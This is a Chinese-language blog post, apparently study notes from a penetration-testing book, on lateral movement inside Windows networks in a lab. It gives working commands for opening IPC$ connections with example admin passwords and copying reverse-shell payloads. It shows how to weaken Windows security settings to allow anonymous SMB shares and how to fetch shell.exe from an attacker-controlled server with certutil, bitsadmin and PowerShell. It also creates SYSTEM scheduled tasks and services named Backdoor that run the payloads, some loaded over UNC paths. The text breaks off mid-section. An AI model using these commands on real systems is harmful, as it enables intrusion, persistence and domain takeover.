<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网横向移动 | Bamboo22 's Blog</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="内网横向移动横向移动（Lateral Movement）是从一个受感染主机迁移到另一个受感染主机的过程。一旦进入内部网络，测试人员就会将已被攻陷的机器作为跳板，继续访问或控制内网中的其他机器，直至获取机密数据或控制关键资产。通过横行移动，测试人员最终可能获取域控制器的权限并接管整个域环境。 横向移动包括用来进入内部网络和控制网络上的远程系统的技术。通常，测试人员需要借助内网代理来探测内网中存活的资">
<meta property="og:type" content="article">
<meta property="og:title" content="内网横向移动">
<meta property="og:url" content="http://example.com/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
<meta property="og:site_name" content="Bamboo22 's Blog">
<meta property="og:description" content="内网横向移动横向移动（Lateral Movement）是从一个受感染主机迁移到另一个受感染主机的过程。一旦进入内部网络，测试人员就会将已被攻陷的机器作为跳板，继续访问或控制内网中的其他机器，直至获取机密数据或控制关键资产。通过横行移动，测试人员最终可能获取域控制器的权限并接管整个域环境。 横向移动包括用来进入内部网络和控制网络上的远程系统的技术。通常，测试人员需要借助内网代理来探测内网中存活的资">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://api.bimg.cc/random">
<meta property="article:published_time" content="2024-01-23T08:30:12.000Z">
<meta property="article:modified_time" content="2024-01-23T08:48:55.934Z">
<meta property="article:author" content="Bamboo22">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://api.bimg.cc/random"><link rel="shortcut icon" href="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="canonical" href="http://example.com/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '内网横向移动',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-23 16:48:55'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.bimg.cc/random')"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网横向移动</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-23T08:30:12.000Z" title="发表于 2024-01-23 16:30:12">2024-01-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-23T08:48:55.934Z" title="更新于 2024-01-23 16:48:55">2024-01-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/">内网渗透体系建设</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网横向移动"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://api.bimg.cc/random');"></div><article class="post-content" id="article-container"><h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><p>横向移动（<strong>Lateral Movement</strong>）是从一个受感染主机迁移到另一个受感染主机的过程。一旦进入内部网络，测试人员就会将已被攻陷的机器作为跳板，继续访问或控制内网中的其他机器，直至获取机密数据或控制关键资产。通过横行移动，测试人员最终可能获取域控制器的权限并接管整个域环境。</p>
<p>横向移动包括用来进入内部网络和控制网络上的远程系统的技术。通常，测试人员需要借助内网代理来探测内网中存活的资产，并确定最终的攻击目标。然后通过收集到的用户凭据，利用各种远程控制技术对目标发起攻击。<br>本章所有关于横向移动的攻击技术都以图5-0-1所示的网络拓扑进行测试。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231031205646974.png" class="" title="image-20231031205646974">

<p><strong>Kali Linux</strong>为测试人员的主机，其对测试人员是可控的，也被称为“可控主机”或“可控服务器”。<br><strong>Initial Victim</strong>为测试人员最初攻陷的机器，也被称为“跳板机“所控主机”或“当前所控主机”。<br>内网中的其他三台机器分别是本次实践的横向移动目标，需要从<strong>Initial Victim</strong>迁移到这三台目标机器。它们也被称为“远程主机”或“内网其他主机”。</p>
<h2 id="横向移动中的文件传输"><a href="#横向移动中的文件传输" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h2><p>攻击时往往需要预先制订文件传输方案，以便在后续操作过程中向攻击目标部署攻击载荷或其他文件。</p>
<h3 id="通过网络共享-IPC"><a href="#通过网络共享-IPC" class="headerlink" title="通过网络共享($IPC)"></a>通过网络共享($IPC)</h3><p><strong>Windows</strong>系统中的网络共享功能可以实现局域网之间的文件共享。通过提供有效的用户凭据，用户可以很轻松地将文件从一台机器传输到另一台机器。<br>执行<code>net share</code>命令，获得<strong>Windows</strong>系统默认开启的网络共享，其中<code>C$</code>为C盘共享，<code>ADMINS$</code>为系统目录共享，还有一个是<code>IPC$</code>共享。<strong>IPC（Internet Process Connection）</strong><br>是共享“命名管道”的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。<br>利用当前所控主机与内网中的其他远程主机建立的网络共享连接，测试人员可以访问远程主机上的资源，如直接查看远程主机目录、在两台主机之间复制文件、读取远程主机上的文件等。而实战中往往会建立<code>IPC$</code>连接。因为通过<code>PC$</code>连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或系统服务等，这在进行内网横向移动中起着至关重要的作用。<br>建立<code>IPC$</code>连接需要具备以下两个条件：</p>
<ol>
<li>远程主机开启了<strong>IPC</strong>连接</li>
<li>远程主机的<strong>139</strong>端口和<strong>445</strong>端口开放。</li>
</ol>
<p>执行以下命令，与远程主机建立<strong>IPC</strong>连接</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.111.137\IPC$ "Admin@123" /user:"administrator"</span><br><span class="line"># net use \\&lt;IP/Hostname&gt;\IPC$ &lt;Password&gt; /user:&lt;Username&gt;</span><br></pre></td></tr></tbody></table></figure>

<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231031211608821.png" alt="image-20231031211608821" style="zoom: 50%;">

<p>此时，执行以下命令，可以成功列出远程主机的C盘共享目录</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.111.163\C$</span><br></pre></td></tr></tbody></table></figure>

<p>使用<strong>copy</strong>命令，可以通过共享连接向远程主机上复制文件，也可以将远程主机上的文件复制到本地，但需要注意当前用户对远程目录的权限。例如，将一个二进制程序复制到远程主机的C盘目录中。实战中可以将攻击载荷上传到远程主机，然后通过其他远程执行的方法来运行，如创建远程计划任务或服务等。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\reverse_tcp.exe \\192.168.111.137\C$</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231031212422033.png" alt="image-20231031212422033" style="zoom:50%;">建立其他共享连接的命令与**IPC$<strong>连接的命令相同，需要指定远程主机的IP或主机名、盘符、用户名和密码。例如，连接远程主机的</strong>C$**共享：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.111.137\C$ "Admin@123" /user:"Administrator"</span><br></pre></td></tr></tbody></table></figure>





<h3 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h3><p><strong>SMB</strong>（<strong>Server Message Block</strong>，服务器消息块），又称<strong>CIFS</strong>（<strong>Common Internet File System</strong>，网络文件共享系统），由微软开发，基于应用层网络传输协议，主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通新等资源。<strong>SMB</strong>消息一般使用<strong>NetBIOS</strong>协议或<strong>TCP</strong>发送，分别使用端口<strong>139</strong>或<strong>445</strong>，目前倾向于使用<strong>445</strong>端口。</p>
<p>实战中可以在测试人员自己的服务器或当前所控内网主机上搭建<strong>SMB</strong>服务器，将需要横向传输的文件如攻击载荷等放入<strong>SMB</strong>服务器的共享目录，并指定<strong>UNC</strong>路径，让横向移动的目标主机远程加载<strong>SMB</strong>共享的文件。注意，需使用<strong>SMB</strong>匿名共享，并且搭建的<strong>SMB</strong>服务器能够被横向移动的目标所访问到。</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>在<strong>Linux</strong>系统上，可以通过<strong>Impacket</strong>项目提供的<strong>smbserver.py</strong>来搭建<strong>SMB</strong>服务器。<br>执行以下命令，即可在搭建一个名为<strong>evilsmb</strong>，共享目录指向<code>/root/share</code>的<strong>SMB</strong>匿名共享。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/share</span><br><span class="line">python smbserver.py evilsmb /root/share -smb2support</span><br></pre></td></tr></tbody></table></figure>



<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><h5 id="通过界面开启可匿名访问的文件共享服务器"><a href="#通过界面开启可匿名访问的文件共享服务器" class="headerlink" title="通过界面开启可匿名访问的文件共享服务器"></a>通过界面开启可匿名访问的文件共享服务器</h5><p>具体方法如下：</p>
<ol>
<li><p>启用Guest用户</p>
<p>运行<code>gpedit.msc</code>，打开组策略</p>
<p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>Security Options</code></p>
<p>选择策略<code>Accounts: Guest account status</code>，设置为<code>Enabled</code></p>
</li>
<li><p>将Everyone权限应用于匿名用户</p>
<p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>Security Options</code></p>
<p>选择策略<code>Network access:Let Everyone permissions apply to anonymous users</code>，设置为<code>Enabled</code></p>
</li>
<li><p>指定匿名共享文件的位置</p>
<p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>Security Options</code></p>
<p>选择策略<code>Network access:Shares that can be accessed anonymously</code>，设置名称，这里可以填入<code>smb</code></p>
</li>
<li><p>将Guest用户从策略“拒绝从网络访问这台计算机”中移除</p>
<p>位置：<code>Computer Configuration</code>-&gt;<code>Windows Settings</code>-&gt;<code>Security Settings</code>-&gt;<code>Local Policies</code>-&gt;<code>User Rights Assignment</code></p>
<p>选择策略<code>Deny access to this computer from the network</code>，移除用户Guest</p>
</li>
<li><p>设置文件共享</p>
<p>选择要共享的文件夹，设置高级共享，共享名为<code>smb</code>，共享权限组或用户名为<code>Everyone</code></p>
<p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为<code>//&lt;ip&gt;/smb</code></p>
</li>
</ol>
<h5 id="使用命令行开启共享"><a href="#使用命令行开启共享" class="headerlink" title="使用命令行开启共享"></a><strong>使用命令行开启共享</strong></h5><ol>
<li><p>启用<strong>Guest</strong>用户</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user guest /active:yes</span><br></pre></td></tr></tbody></table></figure>


</li>
<li><p>将<strong>Everyone</strong>权限应用于匿名用户</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f</span><br></pre></td></tr></tbody></table></figure>


</li>
<li><p>指定匿名共享文件的位置</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d smb /f</span><br></pre></td></tr></tbody></table></figure>


</li>
<li><p>将<strong>Guest</strong>用户从策略“拒绝从网络访问这台计算机”中移除</p>
<p>导出组策略：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /export /cfg gp.inf /quiet</span><br></pre></td></tr></tbody></table></figure>

<p>修改文件<code>gp.inf</code>，将<code>SeDenyNetworkLogonRight = Guest</code>修改为<code>SeDenyNetworkLogonRight =</code>，保存</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231106205656508.png" alt="image-20231106205656508" style="zoom:50%;">

<p>重新导入组策略：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /configure /db gp.sdb /cfg gp.inf /quiet</span><br></pre></td></tr></tbody></table></figure>



<p>强制刷新组策略，立即生效(否则，重启后生效)：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate/force</span><br></pre></td></tr></tbody></table></figure>


</li>
<li><p>设置文件共享</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\share\ /T /grant Everyone:r</span><br><span class="line">net share share=c:\share /grant:everyone,full</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为<code>//&lt;ip&gt;/smb</code></p>
<h5 id="脚本一键开启"><a href="#脚本一键开启" class="headerlink" title="脚本一键开启"></a><strong>脚本一键开启</strong></h5><p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Enable  #开启</span><br><span class="line">Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Disable  #关闭</span><br></pre></td></tr></tbody></table></figure>





<h3 id="通过Windows自带工具"><a href="#通过Windows自带工具" class="headerlink" title="通过Windows自带工具"></a>通过Windows自带工具</h3><h5 id="1-Certutil"><a href="#1-Certutil" class="headerlink" title="1.Certutil"></a>1.Certutil</h5><p><strong>certutil</strong>是<strong>Windows</strong>自带的命令行工具，用于管理<strong>Windows</strong>证书并作为证书服务的一部分安装。<strong>Certutil</strong>提供了从网络中下载文件的功能，测试人员可以在远程主机上执行<strong>Certutil</strong>命令，控制其下载预先部署在可控服务器上的恶意文件，如攻击载荷等。<br>执行以下命今：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://IP:Port/shell.exe C:\reverse_tcp.exe</span><br></pre></td></tr></tbody></table></figure>

<p> 通过<strong>Certutil</strong>下载<strong>shell.exe</strong>，并将其保存到<strong>C:\reverse_tcp.exe</strong></p>
<h5 id="2-BITSAdmin"><a href="#2-BITSAdmin" class="headerlink" title="2.BITSAdmin"></a>2.BITSAdmin</h5><p><strong>Bitsadmin</strong>是一个<strong>Windows</strong>命令行工具，可以用于创建、下载或上载作业，监视其进度。<strong>Windows7</strong>及以后版本的系统自带<strong>Bitsadmin</strong>工具。执行以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer test http://IP:Port/shell.exe C:\reverse_tcp.exe</span><br></pre></td></tr></tbody></table></figure>

<p>创建一个名为<strong>text</strong>的<strong>Bitsadmin</strong>任务，下载<strong>shell.exe</strong>到本地，并将其保存到<code>C:\reverse_tcp.exe</code></p>
<h5 id="3-Powershell"><a href="#3-Powershell" class="headerlink" title="3.Powershell"></a>3.Powershell</h5><p>参考<strong>PowerShell</strong>远程加载执行的思路，可以通过创建<strong>WebClient</strong>对象来实现文件下载。执行以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(New-Object Net.WebClient).DownloadFile('http://IP:Port/shell.exe','C:\reverse_tcp.exe')</span><br></pre></td></tr></tbody></table></figure>

<p>下载<strong>shell.exe</strong>到本地并保存到<code>C:\reverse_tcp.exe</code></p>
<h2 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h2><h3 id="常规利用流程"><a href="#常规利用流程" class="headerlink" title="常规利用流程"></a>常规利用流程</h3><p>通过已有的PC连接，在远程主机上创建计划任务，让目标主机在规定的时间点或周期内执行特定操作。在拥有对方管理员凭据的条件下，可以通过计划任务实现横向移动，具体操作流程如下。</p>
<ol>
<li>利用已建立的共享连接向远程主机（<strong>10.10.10.19</strong>）上传攻击载荷。</li>
<li>利用已建立的<strong>IPC</strong>连接或指定用户凭据的方式在远程主机上创建计划任务。执行以下命令：</li>
</ol>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F</span><br><span class="line"># /S，指定要连接到的系统;  /TN，指定要创建的计划任务的名称;  /SC，指定计划任务执行频率</span><br><span class="line"># /M0，指定计划任务执行周期;  /TR，指定计划任务运行的程序路径;  /RU，指定计划任务运行的用户权限</span><br><span class="line"># /F，如果指定的任务已经存在，则强制创建</span><br></pre></td></tr></tbody></table></figure>

<p>在远程主机上创建一个计划任务，每分钟执行一次上传的攻击载荷。</p>
<p>如果没有建立<strong>IPC</strong>连接，就需要手动指定远程主机的用户凭据：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123</span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.111.136 /TN Backdoor /SC minute /MO 1 /TR C:\Users\bob\Desktop\hack.exe /RU System /F /U Administrator /P 1qaz@WSX</span><br></pre></td></tr></tbody></table></figure>







<h3 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h3><p><strong>Windows</strong>系统中使用<strong>UNC</strong>路径来访问网络共享资源，格式如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\servername\sharename\directory\filename</span><br></pre></td></tr></tbody></table></figure>

<p>其中，<strong>servername</strong>是服务器主机名，<strong>sharename</strong>是网络共享的名称，<strong>directory</strong>和<strong>filename</strong>分别为该共享下的目录和文件。<br>在远程主机上攻击载荷时，可以直接使用<strong>UNC</strong>路径代替常规的本地路径，让远程主机直接在测试人员搭建的<strong>SMB</strong>共享中加载攻击载荷并执行。这样可以省去手动上传攻击载荷的步骤。这里以计划任务为例进行演示，其他类似创建服务、<strong>PsExec</strong>、<strong>WMI</strong>、<strong>DCOM</strong>等远程执行方法都适用。</p>
<ol>
<li>测试人员在一台可控的服务器上搭建<strong>SMB</strong>匿名共享服务，并将生成的攻击载荷放入共享目录。</li>
<li>执行以下命令在靶机上生成攻击载荷并执行。</li>
</ol>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.111.135 /TN Backdoor /SC minute /MO 1 /TR \\192.168.111.136\smb\hack.exe /RU System  /F /U Administrator /P 1qaz@WSX</span><br></pre></td></tr></tbody></table></figure>





<h2 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h2><h3 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h3><p>除了创建计划任务，测试人员还可以通过在远程主机上创建系统服务的方式，在远程主机上运行指定的程序或命令。该方式需要拥有两端主机的管理员权限和**IPC$**连接，具体操作如下。</p>
<ul>
<li><p>利用已建立的共享连接向远程主机（<strong>192.168.111.135</strong>）上传攻击载荷。</p>
</li>
<li><p>利用已建立的<strong>IPC</strong>连接在远程主机上创建系统服务。执行以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.111.135 create Backdoor binpath= "cmd.exe /k C:\reverse_tcp.exe"</span><br><span class="line"># binpath,指定服务启动时运行的二进制文件，注意"="后需要有一个空格</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p>在远程主机上创建一个名为<strong>Backdoor</strong>的系统服务，服务启动时将执行上传的攻击载荷</p>
<ul>
<li><p>执行以下命令</p>
